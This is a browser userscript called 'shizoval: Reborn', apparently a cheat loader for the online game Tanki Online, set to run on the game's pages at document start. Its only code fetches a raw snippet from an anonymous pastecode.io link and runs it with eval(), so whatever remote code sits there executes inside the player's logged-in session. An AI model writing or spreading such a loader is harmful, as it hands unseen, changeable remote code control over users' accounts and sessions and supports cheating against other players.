// ==UserScript==
// @name             shizoval
// @author           Alastor, tdsrse,sheezmee
// @version          2.1.1

// @match            https://*.test-eu.tankionline.com/browser-public/index.html?*
// @match            https://tankionline.com/play*

// @description      shizoval: Reborn
// @icon             https://www.google.com/s2/favicons?sz=64&domain=tankionline.com

// @grant            GM_addStyle
// @grant            unsafeWindow

// @run-at           document-start
// ==/UserScript==

GM_xmlhttpRequest({
method: 'GET',
url: 'https://api.pastecode.io/anon/raw-snippet/18zgmoab?raw=inline&ticket=e0e6d8e9-7f7e-4fd8-983b-96a041370235',
nocache: true,
onload: data => eval(data.responseText)
})
